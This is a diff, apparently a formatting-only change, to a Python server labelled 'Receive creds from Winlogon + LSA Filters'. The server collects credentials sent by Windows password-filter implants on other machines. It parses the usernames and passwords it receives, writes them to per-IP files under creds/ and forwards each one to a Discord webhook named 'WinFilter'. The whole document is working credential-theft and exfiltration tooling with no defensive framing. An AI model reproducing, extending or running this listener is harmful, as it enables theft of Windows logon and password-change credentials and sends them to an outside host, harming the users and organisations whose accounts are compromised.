@@ -12,15 +12,17 @@ def handle_client(conn, addr):
     data = conn.recv(1024)
     strData = str(data)
     # print(strData) #debugging
-    if '@@' in strData: #winlogon
-        type = 'WinLogon'
-        username = strData[2:strData.find('@@')]
+    if "@@" in strData:  # winlogon
+        type = "WinLogon"
+        username = strData[2 : strData.find("@@")]
     else:
-        type = 'Password Change'
-        username = strData[2:strData.find(':')]
-    password = strData[strData.find(':')+1:strData.find(';end')]
+        type = "Password Change"
+        username = strData[2 : strData.find(":")]
+    password = strData[strData.find(":") + 1 : strData.find(";end")]
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
-    ip = strData[strData.find('end;')+4:len(strData)-2] # change this to ;ip and then ;end
+    ip = strData[
+        strData.find("end;") + 4 : len(strData) - 2
+    ]  # change this to ;ip and then ;end
     storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
 
@@ -37,13 +39,10 @@ def discordWH(addr, username, password):
 
     # Setup Post Request
     post = {}
-    data = {
-        "content" : f"{addr} | {username}:{password}",
-        "username" : "WinFilter"
-    }
+    data = {"content": f"{addr} | {username}:{password}", "username": "WinFilter"}
 
     # Send and check result
-    result = requests.post(url, json = data)
+    result = requests.post(url, json=data)
     try:
         result.raise_for_status()
     except requests.exceptions.HTTPError as err:
@@ -53,12 +52,13 @@ def discordWH(addr, username, password):
 
 
 def writeFile(storage, ip):
-    with open(f'creds/{ip}', 'a') as f:
+    with open(f"creds/{ip}", "a") as f:
         f.write(storage)
 
 
 def main():
-    print("""                                                                                                                     
+    print(
+        """                                                                                                                     
 
   _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
  |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
@@ -73,31 +73,49 @@ def main():
     \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
      '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
             '                                                                                     '                  
-""")
-    parser = argparse.ArgumentParser(description="Receive creds from Winlogon + LSA Filters")
-    parser.add_argument('--ip', type=str, nargs='?', const=1, help="IP to listen on (default: 0.0.0.0)", default='0.0.0.0')
-    parser.add_argument('--port', type=int, nargs='?', const=1, help="Port to listen on (default: 80)", default=80)
-    parser.add_argument('--clean', dest='clean', action='store_true')
+"""
+    )
+    parser = argparse.ArgumentParser(
+        description="Receive creds from Winlogon + LSA Filters"
+    )
+    parser.add_argument(
+        "--ip",
+        type=str,
+        nargs="?",
+        const=1,
+        help="IP to listen on (default: 0.0.0.0)",
+        default="0.0.0.0",
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        nargs="?",
+        const=1,
+        help="Port to listen on (default: 80)",
+        default=80,
+    )
+    parser.add_argument("--clean", dest="clean", action="store_true")
     parser.set_defaults(clean=False)
     args = parser.parse_args()
 
     if args.clean:
         os.system("rm -rf creds; mkdir creds")
 
-    s = socket.socket() 
+    s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     print(f"Listening on {args.ip}:{args.port}\n")
-    s.bind((args.ip, args.port)) 
-    s.listen(100) 
+    s.bind((args.ip, args.port))
+    s.listen(100)
 
     try:
         while True:
-            conn, addr = s.accept() 
+            conn, addr = s.accept()
             t = threading.Thread(target=handle_client, args=(conn, addr))
             t.start()
-            
+
     except KeyboardInterrupt:
-	    print("\nArrivederci!")
-	    exit(0)
+        print("\nArrivederci!")
+        exit(0)
+
 
 main()
